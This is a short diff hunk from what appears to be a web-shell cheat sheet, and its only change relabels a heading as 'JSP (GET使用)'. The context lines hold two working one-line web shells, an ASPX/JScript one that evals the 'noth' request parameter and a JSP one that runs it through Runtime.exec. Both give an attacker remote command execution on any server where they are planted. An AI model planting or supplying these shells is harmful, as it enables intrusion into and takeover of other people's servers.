@@ -12,6 +12,6 @@
 <%@ Page Language="Jscript"%>
 <%eval(Request.Item["noth"])%>
 ```
-# JSP:
+# JSP (GET使用):
 <%Runtime.getRuntime().exec(request.getParameter("noth"));%>
 ```
